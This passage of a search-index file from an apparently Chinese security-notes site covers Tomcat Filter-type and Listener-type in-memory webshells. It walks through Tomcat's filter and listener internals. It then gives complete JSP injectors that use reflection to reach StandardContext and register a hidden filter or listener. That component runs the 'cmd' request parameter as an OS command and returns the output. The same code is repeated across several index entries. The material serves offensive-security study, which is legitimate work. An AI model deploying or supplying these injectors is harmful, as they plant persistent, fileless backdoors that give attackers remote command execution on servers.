servletResponse.getWriter().write(new String(bytes, 0, len)); process.destroy(); return; } filterChain.doFilter(servletRequest, servletResponse); } @Override public void destroy() { } }; // FilterDef FilterDef filterDef = new FilterDef(); filterDef.setFilter(filter); filterDef.setFilterName(name); filterDef.setFilterClass(filter.getClass().getName()); standardContext.addFilterDef(filterDef); // FilterMap FilterMap filterMap = new FilterMap(); filterMap.addURLPattern(\"/*\"); filterMap.setFilterName(name); filterMap.setDispatcher(DispatcherType.REQUEST.name()); standardContext.addFilterMapBefore(filterMap); //ApplicationFilterConfig Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class); constructor.setAccessible(true); ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef); filterConfigs.put(name, filterConfig); out.print(\"Inject Success !\"); } %> \u6ce8\u610f\u4e8b\u9879 # \u8fd9\u79cd\u6ce8\u5165filter\u5185\u5b58\u9a6c\u7684\u65b9\u6cd5\u53ea\u652f\u6301 Tomcat 7.x \u4ee5\u4e0a\uff0c\u56e0\u4e3a javax.servlet.DispatcherType \u7c7b\u662fservlet 3 \u4ee5\u540e\u5f15\u5165\uff0c\u800c Tomcat 7\u4ee5\u4e0a\u624d\u652f\u6301 Servlet 3 filterMap . setDispatcher ( DispatcherType . REQUEST . name ()); \u53e6\u5916\u5728tomcat\u4e0d\u540c\u7248\u672c\u9700\u8981\u901a\u8fc7\u4e0d\u540c\u7684\u5e93\u5f15\u5165FilterMap\u548cFilterDef <!-- tomcat 7 --> <%@ page import = \"org.apache.catalina.deploy.FilterMap\" %> <%@ page import = \"org.apache.catalina.deploy.FilterDef\" %> <!-- tomcat 8/9 --> <%@ page import = \"org.apache.tomcat.util.descriptor.web.FilterMap\" %> <%@ page import = \"org.apache.tomcat.util.descriptor.web.FilterDef\" %>","title":"Tomcat-Filter\u578b\u5185\u5b58\u9a6c"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Filter%E5%9E%8B/#tomcat-filter\u578b\u5185\u5b58\u9a6c","text":"","title":"Tomcat-Filter\u578b\u5185\u5b58\u9a6c"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Filter%E5%9E%8B/#\u53c2\u8003\u6587\u7ae0","text":"http://wjlshare.com/archives/1529","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Filter%E5%9E%8B/#tomcat-filter","text":"filter\u987e\u540d\u601d\u4e49\u5c31\u662f\u8fc7\u6ee4\u5668\u7684\u610f\u601d\uff0c\u5728tomca\u4e2d\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u81ea\u5b9a\u4e49\u8fc7\u6ee4\u5668\u6765\u505a\u5230\u5bf9\u7528\u6237\u7684\u4e00\u4e9b\u8bf7\u6c42\u8fdb\u884c\u62e6\u622a\u4fee\u6539\u7b49\u64cd\u4f5c: \u6211\u4eec\u7684\u8bf7\u6c42\u4f1a\u5728\u7ecf\u8fc7Servlet\u4e4b\u524d\u5148\u7ecf\u8fc7filter\uff0c\u90a3\u4e48\u5982\u679c\u6211\u4eec\u52a8\u6001\u521b\u5efa\u4e00\u4e2afilter\u5e76\u5c06\u5176\u653e\u5728\u6700\u524d\u9762\uff0c\u5e76\u5728\u8fd9\u4e2afilter\u4e2d\u653e\u5165\u6076\u610f\u4ee3\u7801\uff0c\u5f53\u6211\u4eec\u8bbf\u95eeServlet\u7684\u65f6\u5019\u5c31\u80fd\u6210\u529f\u6267\u884c\u6211\u4eec\u7684\u6076\u610f\u4ee3\u7801\uff0c\u8fd9\u4e5f\u662f\u6240\u8c13\u7684\u5185\u5b58webshell(\u56e0\u4e3afilter\u662f\u52a8\u6001\u521b\u5efa\u7684\uff0c\u6ca1\u6709\u6587\u4ef6\u843d\u5730)\uff0c\u90a3\u4e48\u8981\u5982\u4f55\u52a8\u6001\u5730\u521b\u5efa\u4e00\u4e2afilter\u5462\uff1f","title":"Tomcat-Filter"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Filter%E5%9E%8B/#filter\u6d41\u7a0b\u5206\u6790","text":"\u6211\u4eec\u5148\u6765\u4e86\u89e3\u4e00\u4e0b\u5728Tomcat\u4e2d\u4e0eFilter\u5bc6\u5207\u76f8\u5173\u7684\u51e0\u4e2a\u7c7b: - FilterDefs\uff1a\u5b58\u653eFilterDef\u7684\u6570\u7ec4 \uff0cFilterDef \u4e2d\u5b58\u50a8\u7740\u6211\u4eec\u8fc7\u6ee4\u5668\u540d\uff0c\u8fc7\u6ee4\u5668\u5b9e\u4f8b\uff0c\u4f5c\u7528 url \u7b49\u57fa\u672c\u4fe1\u606f - FilterConfigs\uff1a\u5b58\u653efilterConfig\u7684\u6570\u7ec4\uff0c\u5728 FilterConfig \u4e2d\u4e3b\u8981\u5b58\u653e FilterDef \u548c Filter\u5bf9\u8c61\u7b49\u4fe1\u606f - FilterMaps\uff1a\u5b58\u653eFilterMap\u7684\u6570\u7ec4\uff0c\u5728 FilterMap \u4e2d\u4e3b\u8981\u5b58\u653e\u4e86 FilterName \u548c \u5bf9\u5e94\u7684URLPattern - FilterChain\uff1a\u8fc7\u6ee4\u5668\u94fe\uff0c\u8be5\u5bf9\u8c61\u4e0a\u7684 doFilter \u65b9\u6cd5\u80fd\u4f9d\u6b21\u8c03\u7528\u94fe\u4e0a\u7684 Filter - WebXml\uff1a\u5b58\u653e web.xml \u4e2d\u5185\u5bb9\u7684\u7c7b - ContextConfig\uff1aWeb\u5e94\u7528\u7684\u4e0a\u4e0b\u6587\u914d\u7f6e\u7c7b - StandardContext\uff1aContext\u63a5\u53e3\u7684\u6807\u51c6\u5b9e\u73b0\u7c7b\uff0c\u4e00\u4e2a Context \u4ee3\u8868\u4e00\u4e2a Web \u5e94\u7528\uff0c\u5176\u4e0b\u53ef\u4ee5\u5305\u542b\u591a\u4e2a Wrapper - StandardWrapperValve\uff1a\u4e00\u4e2a Wrapper \u7684\u6807\u51c6\u5b9e\u73b0\u7c7b\uff0c\u4e00\u4e2a Wrapper \u4ee3\u8868\u4e00\u4e2aServlet \u7136\u540e\u6211\u4eec\u7f16\u5199\u4e00\u4e2aDemoFilter\u6765\u505a\u6d4b\u8bd5: package top.longlone.filter ; import javax.servlet.* ; import java.io.IOException ; public class DemoFilter implements Filter { @Override public void init ( FilterConfig filterConfig ) throws ServletException { System . out . println ( \"filter init\" ); } @Override public void doFilter ( ServletRequest request , ServletResponse response , FilterChain chain ) throws IOException , ServletException { System . out . println ( \"do filter\" ); chain . doFilter ( request , response ); } @Override public void destroy () { } } \u914d\u7f6e\u597d\u5bf9\u5e94\u7684web.xml: <filter> <filter-name> DemoFilter </filter-name> <filter-class> top.longlone.filter.DemoFilter </filter-class> </filter> <filter-mapping> <filter-name> DemoFilter </filter-name> <url-pattern> /* </url-pattern> </filter-mapping> \u63a5\u4e0b\u6765\u5728 doFilter() \u65b9\u6cd5\u6253\u4e0b\u65ad\u70b9\uff0c\u8fd0\u884ctomcat\u670d\u52a1\u5668\u5e76\u8bbf\u95ee: \u67e5\u770b\u8c03\u7528\u6808\uff0c\u8ddf\u8fdb StandardWrapperVavle.invoke() \u65b9\u6cd5: \u53d1\u73b0\u4ed6\u662f\u6839\u636efilterChain\u6765\u53bb\u505afilter\u7684\uff0c\u6839\u636e\u641c\u7d22\u627e\u5230filterChain\u7684\u5b9a\u4e49\u4f4d\u7f6e: \u91cd\u65b0\u4e0b\u65ad\u70b9\u5230\u8fd9\u4e2a\u4f4d\u7f6e\uff0c\u8ddf\u8fdb ApplicationFilterFactory.createFilterChain() \u65b9\u6cd5\uff0c\u5206\u6790\u8be5\u65b9\u6cd5\uff0c\u53d1\u73b0\u5176\u5148\u4f1a\u4f1a\u8c03\u7528 getParent() \u65b9\u6cd5\u83b7\u53d6 StandardContext \uff0c\u518d\u83b7\u53d6filterMaps: filterMaps\u4e2d\u7684 filterMap \u4e3b\u8981\u5b58\u653e\u4e86\u8fc7\u6ee4\u5668\u7684\u540d\u5b57\u4ee5\u53ca\u4f5c\u7528\u7684 url: \u63a5\u4e0b\u6765\u4f1a\u904d\u5386filterMaps \u4e2d\u7684 filterMap\uff0c\u5982\u679c\u53d1\u73b0\u7b26\u5408\u5f53\u524d\u8bf7\u6c42 url \u4e0e filterMap \u4e2d\u7684 urlPattern \u5339\u914d\u4e14\u901a\u8fc7filterName\u80fd\u627e\u5230\u5bf9\u5e94\u7684filterConfig\uff0c\u5219\u4f1a\u5c06\u5176\u52a0\u5165filterChain: \u67e5\u770bfilterConfig\u7684\u7ed3\u6784\uff0c\u91cc\u9762\u4e3b\u8981\u5305\u542b\u4e86filter\u540d\uff0cfilter\u548cfilterDef: \u81f3\u6b64filterChain\u7ec4\u88c5\u5b8c\u6bd5\uff0c\u91cd\u65b0\u56de\u5230 StandardContextValue \u4e2d\uff0c\u540e\u9762\u4f1a\u8c03\u7528 filterChain.doFilter() \u65b9\u6cd5: \u8ddf\u8fdb filterChain.doFilter() \u65b9\u6cd5\uff0c\u5176\u4f1a\u8c03\u7528 internalDoFilter() \u65b9\u6cd5: \u4f1a\u4ecefilters\u4e2d\u4f9d\u6b21\u62ff\u5230filter\u548cfilterConfig\uff0c\u6700\u7ec8\u8c03\u7528 filter.doFilter() : \u5f15\u7528\u4e00\u5f20\u7ecf\u5178\u56fe\u7247\u6765\u63cf\u8ff0filter\u7684\u5de5\u4f5c\u539f\u7406:","title":"Filter\u6d41\u7a0b\u5206\u6790"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Filter%E5%9E%8B/#\u5185\u5b58\u9a6c\u5b9e\u73b0\u6d41\u7a0b\u5206\u6790","text":"\u6839\u636e\u4e0a\u9762\u7684\u8c03\u8bd5\uff0c\u6211\u4eec\u53d1\u73b0\u6700\u5173\u952e\u7684\u5c31\u662f StandardContext.findFilterMaps() \u548c StandardContext.findFilterConfig() \uff0c\u6211\u4eec\u53ef\u4ee5\u6765\u770b\u770b\u8fd92\u4e2a\u65b9\u6cd5\u7684\u5b9e\u73b0\uff0c\u53ef\u4ee5\u770b\u5230\u90fd\u662f\u76f4\u63a5\u4eceStandardContext\u4e2d\u53d6\u5230\u5bf9\u5e94\u7684\u5c5e\u6027\uff0c\u90a3\u4e48\u6211\u4eec\u53ea\u8981\u5f80\u8fd92\u4e2a\u5c5e\u6027\u91cc\u9762\u63d2\u5165\u5bf9\u5e94\u7684filterMap\u548cfilterConfig\u5373\u53ef\u5b9e\u73b0\u52a8\u6001\u6dfb\u52a0filter\u7684\u76ee\u7684: \u5b9e\u9645\u4e0aStandardContext\u4e5f\u6709\u4e00\u4e9b\u65b9\u6cd5\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u6dfb\u52a0\u5c5e\u6027\u3002\u9996\u5148\u6211\u4eec\u6765\u770bfiltermaps\uff0cStandardContext\u76f4\u63a5\u63d0\u4f9b\u4e86\u5bf9\u5e94\u7684\u6dfb\u52a0\u65b9\u6cd5(Before\u662f\u5c06filter\u653e\u5728\u9996\u4f4d\uff0c\u6b63\u662f\u6211\u4eec\u9700\u8981\u7684)\uff0c\u8fd9\u91cc\u518d\u5f80filterMaps\u6dfb\u52a0\u4e4b\u524d\u4f1a\u6709\u4e00\u4e2a\u6821\u9a8cfiltermap\u662f\u5426\u5408\u6cd5\u7684\u64cd\u4f5c\uff0c\u8ddf\u8fdb validateFilterMap() : \u53ef\u4ee5\u770b\u5230\u8fd9\u91cc\u6709\u4e00\u4e2a\u5751\u70b9\uff0c\u5b83\u4f1a\u6839\u636efilterName\u53bb\u5bfb\u627e\u5bf9\u5e94\u7684filterDef\uff0c\u5982\u679c\u6ca1\u627e\u5230\u7684\u8bdd\u4f1a\u76f4\u63a5\u629b\u51fa\u5f02\u5e38\uff0c\u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u8fd8\u9700\u8981\u5f80filterDefs\u91cc\u6dfb\u52a0filterDef\u3002 \u90a3\u4e48\u6211\u4eec\u63a5\u4e0b\u6765\u518d\u770bfilterDefs\uff0cStandardContext\u76f4\u63a5\u63d0\u4f9b\u4e86\u5bf9\u5e94\u7684\u6dfb\u52a0\u65b9\u6cd5: \u6700\u540e\u6211\u4eec\u518d\u6765\u770bfilterConfigs\uff0c\u6839\u636e\u547d\u540d\u89c4\u5219\u641c\u7d22 addFilterConfig \uff0c\u53d1\u73b0\u5e76\u6ca1\u6709\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u6240\u4ee5\u6211\u4eec\u8003\u8651\u8981\u901a\u8fc7\u53cd\u5c04\u7684\u65b9\u6cd5\u624b\u52a8\u83b7\u53d6\u5c5e\u6027\u5e76\u6dfb\u52a0: \u6700\u540e\u603b\u7ed3\u4e0bFilter\u578b\u5185\u5b58\u9a6c(\u5373\u52a8\u6001\u521b\u5efafilter)\u7684\u6b65\u9aa4: 1. \u83b7\u53d6StandardContext 2. \u7ee7\u627f\u5e76\u7f16\u5199\u4e00\u4e2a\u6076\u610ffilter 3. \u5b9e\u4f8b\u5316\u4e00\u4e2aFilterDef\u7c7b\uff0c\u5305\u88c5filter\u5e76\u5b58\u653e\u5230StandardContext.filterDefs\u4e2d 4. \u5b9e\u4f8b\u5316\u4e00\u4e2aFilterMap\u7c7b\uff0c\u5c06\u6211\u4eec\u7684 Filter \u548c urlpattern \u76f8\u5bf9\u5e94\uff0c\u5b58\u653e\u5230StandardContext.filterMaps\u4e2d(\u4e00\u822c\u4f1a\u653e\u5728\u9996\u4f4d) 5. \u901a\u8fc7\u53cd\u5c04\u83b7\u53d6filterConfigs\uff0c\u5b9e\u4f8b\u5316\u4e00\u4e2aFilterConfig(ApplicationFilterConfig)\u7c7b\uff0c\u4f20\u5165StandardContext\u4e0efilterDefs\uff0c\u5b58\u653e\u5230filterConfig\u4e2d \u4ee5\u4e0b\u662f\u4ee3\u7801\u7684\u5177\u4f53\u5b9e\u73b0: <!-- tomcat 8 --> <%@ page import=\"org.apache.catalina.core.ApplicationContext\" %> <%@ page import=\"java.lang.reflect.Field\" %> <%@ page import=\"org.apache.catalina.core.StandardContext\" %> <%@ page import=\"java.util.Map\" %> <%@ page import=\"java.io.IOException\" %> <%@ page import=\"org.apache.tomcat.util.descriptor.web.FilterDef\" %> <%@ page import=\"org.apache.tomcat.util.descriptor.web.FilterMap\" %> <%@ page import=\"java.lang.reflect.Constructor\" %> <%@ page import=\"org.apache.catalina.core.ApplicationFilterConfig\" %> <%@ page import=\"org.apache.catalina.Context\" %> <%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\" pageEncoding=\"UTF-8\"%> <% String name = \"Longlone\"; // \u83b7\u53d6StandardContext ServletContext servletContext = request.getServletContext(); Field appctx = servletContext.getClass().getDeclaredField(\"context\"); appctx.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(\"context\"); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); // \u83b7\u53d6filterConfigs Field Configs = standardContext.getClass().getDeclaredField(\"filterConfigs\"); Configs.setAccessible(true); Map filterConfigs = (Map) Configs.get(standardContext); if (filterConfigs.get(name) == null) { Filter filter = new Filter() { @Override public void init(FilterConfig filterConfig) throws ServletException { } @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { HttpServletRequest req = (HttpServletRequest) servletRequest; if (req.getParameter(\"cmd\") != null) { byte[] bytes = new byte[1024]; Process process = new ProcessBuilder(\"cmd.exe\", \"/C\", req.getParameter(\"cmd\")).start(); int len = process.getInputStream().read(bytes); servletResponse.getWriter().write(new String(bytes, 0, len)); process.destroy(); return; } filterChain.doFilter(servletRequest, servletResponse); } @Override public void destroy() { } }; // FilterDef FilterDef filterDef = new FilterDef(); filterDef.setFilter(filter); filterDef.setFilterName(name); filterDef.setFilterClass(filter.getClass().getName()); standardContext.addFilterDef(filterDef); // FilterMap FilterMap filterMap = new FilterMap(); filterMap.addURLPattern(\"/*\"); filterMap.setFilterName(name); filterMap.setDispatcher(DispatcherType.REQUEST.name()); standardContext.addFilterMapBefore(filterMap); //ApplicationFilterConfig Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class); constructor.setAccessible(true); ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef); filterConfigs.put(name, filterConfig); out.print(\"Inject Success !\"); } %>","title":"\u5185\u5b58\u9a6c\u5b9e\u73b0\u6d41\u7a0b\u5206\u6790"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Filter%E5%9E%8B/#\u6ce8\u610f\u4e8b\u9879","text":"\u8fd9\u79cd\u6ce8\u5165filter\u5185\u5b58\u9a6c\u7684\u65b9\u6cd5\u53ea\u652f\u6301 Tomcat 7.x \u4ee5\u4e0a\uff0c\u56e0\u4e3a javax.servlet.DispatcherType \u7c7b\u662fservlet 3 \u4ee5\u540e\u5f15\u5165\uff0c\u800c Tomcat 7\u4ee5\u4e0a\u624d\u652f\u6301 Servlet 3 filterMap . setDispatcher ( DispatcherType . REQUEST . name ()); \u53e6\u5916\u5728tomcat\u4e0d\u540c\u7248\u672c\u9700\u8981\u901a\u8fc7\u4e0d\u540c\u7684\u5e93\u5f15\u5165FilterMap\u548cFilterDef <!-- tomcat 7 --> <%@ page import = \"org.apache.catalina.deploy.FilterMap\" %> <%@ page import = \"org.apache.catalina.deploy.FilterDef\" %> <!-- tomcat 8/9 --> <%@ page import = \"org.apache.tomcat.util.descriptor.web.FilterMap\" %> <%@ page import = \"org.apache.tomcat.util.descriptor.web.FilterDef\" %>","title":"\u6ce8\u610f\u4e8b\u9879"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Listener%E5%9E%8B/","tags":["java","java\u5b89\u5168","\u5185\u5b58\u9a6c"],"text":"Tomcat-Listener\u578b\u5185\u5b58\u9a6c # \u53c2\u8003\u6587\u7ae0 # http://wjlshare.com/archives/1651 Tomcat-Listener # Listener\uff08\u76d1\u542c\u5668\uff09\u5c31\u662f\u4e00\u4e2a\u5b9e\u73b0\u7279\u5b9a\u63a5\u53e3\u7684\u666e\u901ajava\u7a0b\u5e8f\uff0c\u8fd9\u4e2a\u7a0b\u5e8f\u4e13\u95e8\u7528\u4e8e\u76d1\u542c\u53e6\u4e00\u4e2ajava\u5bf9\u8c61\u7684\u65b9\u6cd5\u8c03\u7528\u6216\u5c5e\u6027\u6539\u53d8\uff0c\u5f53\u88ab\u76d1\u542c\u5bf9\u8c61\u53d1\u751f\u4e0a\u8ff0\u4e8b\u4ef6\u540e\uff0c\u76d1\u542c\u5668\u67d0\u4e2a\u65b9\u6cd5\u5c06\u7acb\u5373\u88ab\u6267\u884c\u3002Listener\u5e38\u7528\u4e8eGUI\u5e94\u7528\u7a0b\u5e8f\u4e2d\uff0c\u6211\u4eec\u7684\u5185\u5b58\u9a6c\u4e3b\u8981\u6d89\u53ca\u5230\u7684\u662f ServletRequestListener (\u7531\u4e8e\u5176\u5728\u6bcf\u6b21\u8bf7\u6c42\u4e2d\u90fd\u4f1a\u89e6\u53d1) Listener\u6d41\u7a0b\u5206\u6790 # \u9996\u5148\u7f16\u5199\u4e00\u4e2aListener\u5e76\u5199\u5165web.xml: package top.longlone.listener ; import javax.servlet.ServletRequestEvent ; import javax.servlet.ServletRequestListener ; public class DemoListener implements ServletRequestListener { @Override public void requestDestroyed ( ServletRequestEvent sre ) { } @Override public void requestInitialized ( ServletRequestEvent sre ) { System . out . println ( \"request init\" ); } } <listener> <listener-class> top.longlone.listener.DemoListener </listener-class> </listener> \u7136\u540e\u6211\u4eec\u5728\u8fd9\u4e2aListener\u7684class\u90e8\u5206\u548c requestInitialized() \u4e0b\u65ad\u70b9: \u5f00\u542f\u8c03\u8bd5\u89e6\u53d1\u65ad\u70b9\uff0c\u6839\u636e\u5806\u6808\u56de\u6eaf\u627e\u5230 StandardContext.listenerStart() \u65b9\u6cd5\uff0c\u53ef\u4ee5\u770b\u5230\u5b83\u5148\u8c03\u7528 findApplicationListeners() \u83b7\u53d6Listener\u7684\u540d\u5b57\uff0c\u7136\u540e\u5b9e\u4f8b\u5316: \u63a5\u7740\u4ed6\u4f1a\u904d\u5386results\u4e2d\u7684Listener\uff0c\u6839\u636e\u4e0d\u540c\u7684\u7c7b\u578b\u653e\u5165\u4e0d\u540c\u7684\u6570\u7ec4\uff0c\u6211\u4eec\u8fd9\u91cc\u7684ServletRequestListener\u653e\u5165eventListeners\u6570\u7ec4\u4e2d: \u63a5\u4e0b\u6765\u7684\u64cd\u4f5c\u662f\u901a\u8fc7\u8c03\u7528 getApplicationEventListeners() \u83b7\u53d6applicationEventListenersList\u4e2d\u7684\u503c\uff0c\u7136\u540e\u518d\u8bbe\u7f6eapplicationEventListenersList\uff0c\u53ef\u4ee5\u7406\u89e3\u4e3aapplicationEventListenersList\u52a0\u4e0a\u521a\u521a\u5b9e\u4f8b\u5316\u7684eventListeners: \u63a5\u4e0b\u6765\u770b\u7b2c\u4e8c\u4e2a\u65ad\u70b9\uff0c\u6839\u636e\u8c03\u7528\u5806\u6808\u6211\u4eec\u627e\u5230\u4e86 fireRequestInitEvent() \u65b9\u6cd5\uff0c\u5b83\u4f1a\u8c03\u7528 getApplicationEventListeners() \u5e76\u8c03\u7528\u5176\u4e2d\u6240\u6709\u7684 ServletRequestListener.requestInitialized() : \u5185\u5b58\u9a6c\u5b9e\u73b0\u6d41\u7a0b\u5206\u6790 # \u6839\u636e\u4e0a\u9762\u7684\u5206\u6790\u6211\u4eec\u77e5\u9053Listener\u6765\u6e90\u4e8etomcat\u521d\u59cb\u5316\u65f6\u4eceweb.xml\u5b9e\u4f8b\u5316\u7684Listener\u548capplicationEventListenersList\u4e2d\u7684Listener\uff0c\u524d\u8005\u6211\u4eec\u65e0\u6cd5\u63a7\u5236\uff0c\u4f46\u662f\u540e\u8005\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\uff0c\u53ea\u9700\u8981\u5f80applicationEventListenersList\u4e2d\u52a0\u5165\u6211\u4eec\u7684\u6076\u610fListener\u5373\u53ef\u3002 \u5b9e\u9645\u4e0aStandardContext\u5b58\u5728 addApplicationEventListener() \u65b9\u6cd5\u53ef\u4ee5\u76f4\u63a5\u7ed9\u6211\u4eec\u8c03\u7528\uff0c\u5f80applicationEventListenersList\u4e2d\u52a0\u5165Listener\u3002 \u6240\u4ee5\u6211\u4eec\u7684Listener\u5185\u5b58\u9a6c\u5b9e\u73b0\u6b65\u9aa4: - \u7ee7\u627f\u5e76\u7f16\u5199\u4e00\u4e2a\u6076\u610fListener - \u83b7\u53d6StandardContext - \u8c03\u7528 StandardContext.addApplicationEventListener() \u6dfb\u52a0\u6076\u610fListener \u4ee5\u4e0b\u662f\u4ee3\u7801\u7684\u5177\u4f53\u5b9e\u73b0: <%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %> <%@ page import=\"org.apache.catalina.core.ApplicationContext\" %> <%@ page import=\"org.apache.catalina.core.StandardContext\" %> <%@ page import=\"javax.servlet.*\" %> <%@ page import=\"javax.servlet.annotation.WebServlet\" %> <%@ page import=\"javax.servlet.http.HttpServlet\" %> <%@ page import=\"javax.servlet.http.HttpServletRequest\" %> <%@ page import=\"javax.servlet.http.HttpServletResponse\" %> <%@ page import=\"java.io.IOException\" %> <%@ page import=\"java.lang.reflect.Field\" %> <% class S implements ServletRequestListener{ @Override public void requestDestroyed(ServletRequestEvent servletServletRequestListenerRequestEvent) { } @Override public void requestInitialized(ServletRequestEvent servletRequestEvent) { String cmd = servletRequestEvent.getServletRequest().getParameter(\"cmd\"); if(cmd != null){ try { Runtime.getRuntime().exec(cmd); } catch (IOException e) {} } } } %> <% ServletContext servletContext = request.getServletContext(); Field appctx = servletContext.getClass().getDeclaredField(\"context\"); appctx.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(\"context\"); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); S servletRequestListener = new S(); standardContext.addApplicationEventListener(servletRequestListener); out.println(\"inject success\"); %>","title":"Tomcat-Listener\u578b\u5185\u5b58\u9a6c"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Listener%E5%9E%8B/#tomcat-listener\u578b\u5185\u5b58\u9a6c","text":"","title":"Tomcat-Listener\u578b\u5185\u5b58\u9a6c"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Listener%E5%9E%8B/#\u53c2\u8003\u6587\u7ae0","text":"http://wjlshare.com/archives/1651","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Listener%E5%9E%8B/#tomcat-listener","text":"Listener\uff08\u76d1\u542c\u5668\uff09\u5c31\u662f\u4e00\u4e2a\u5b9e\u73b0\u7279\u5b9a\u63a5\u53e3\u7684\u666e\u901ajava\u7a0b\u5e8f\uff0c\u8fd9\u4e2a\u7a0b\u5e8f\u4e13\u95e8\u7528\u4e8e\u76d1\u542c\u53e6\u4e00\u4e2ajava\u5bf9\u8c61\u7684\u65b9\u6cd5\u8c03\u7528\u6216\u5c5e\u6027\u6539\u53d8\uff0c\u5f53\u88ab\u76d1\u542c\u5bf9\u8c61\u53d1\u751f\u4e0a\u8ff0\u4e8b\u4ef6\u540e\uff0c\u76d1\u542c\u5668\u67d0\u4e2a\u65b9\u6cd5\u5c06\u7acb\u5373\u88ab\u6267\u884c\u3002Listener\u5e38\u7528\u4e8eGUI\u5e94\u7528\u7a0b\u5e8f\u4e2d\uff0c\u6211\u4eec\u7684\u5185\u5b58\u9a6c\u4e3b\u8981\u6d89\u53ca\u5230\u7684\u662f ServletRequestListener (\u7531\u4e8e\u5176\u5728\u6bcf\u6b21\u8bf7\u6c42\u4e2d\u90fd\u4f1a\u89e6\u53d1)","title":"Tomcat-Listener"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Listener%E5%9E%8B/#listener\u6d41\u7a0b\u5206\u6790","text":"\u9996\u5148\u7f16\u5199\u4e00\u4e2aListener\u5e76\u5199\u5165web.xml: package top.longlone.listener ; import javax.servlet.ServletRequestEvent ; import javax.servlet.ServletRequestListener ; public class DemoListener implements ServletRequestListener { @Override public void requestDestroyed ( ServletRequestEvent sre ) { } @Override public void requestInitialized ( ServletRequestEvent sre ) { System . out . println ( \"request init\" ); } } <listener> <listener-class> top.longlone.listener.DemoListener </listener-class> </listener> \u7136\u540e\u6211\u4eec\u5728\u8fd9\u4e2aListener\u7684class\u90e8\u5206\u548c requestInitialized() \u4e0b\u65ad\u70b9: \u5f00\u542f\u8c03\u8bd5\u89e6\u53d1\u65ad\u70b9\uff0c\u6839\u636e\u5806\u6808\u56de\u6eaf\u627e\u5230 StandardContext.listenerStart() \u65b9\u6cd5\uff0c\u53ef\u4ee5\u770b\u5230\u5b83\u5148\u8c03\u7528 findApplicationListeners() \u83b7\u53d6Listener\u7684\u540d\u5b57\uff0c\u7136\u540e\u5b9e\u4f8b\u5316: \u63a5\u7740\u4ed6\u4f1a\u904d\u5386results\u4e2d\u7684Listener\uff0c\u6839\u636e\u4e0d\u540c\u7684\u7c7b\u578b\u653e\u5165\u4e0d\u540c\u7684\u6570\u7ec4\uff0c\u6211\u4eec\u8fd9\u91cc\u7684ServletRequestListener\u653e\u5165eventListeners\u6570\u7ec4\u4e2d: \u63a5\u4e0b\u6765\u7684\u64cd\u4f5c\u662f\u901a\u8fc7\u8c03\u7528 getApplicationEventListeners() \u83b7\u53d6applicationEventListenersList\u4e2d\u7684\u503c\uff0c\u7136\u540e\u518d\u8bbe\u7f6eapplicationEventListenersList\uff0c\u53ef\u4ee5\u7406\u89e3\u4e3aapplicationEventListenersList\u52a0\u4e0a\u521a\u521a\u5b9e\u4f8b\u5316\u7684eventListeners: \u63a5\u4e0b\u6765\u770b\u7b2c\u4e8c\u4e2a\u65ad\u70b9\uff0c\u6839\u636e\u8c03\u7528\u5806\u6808\u6211\u4eec\u627e\u5230\u4e86 fireRequestInitEvent() \u65b9\u6cd5\uff0c\u5b83\u4f1a\u8c03\u7528 getApplicationEventListeners() \u5e76\u8c03\u7528\u5176\u4e2d\u6240\u6709\u7684 ServletRequestListener.requestInitialized() 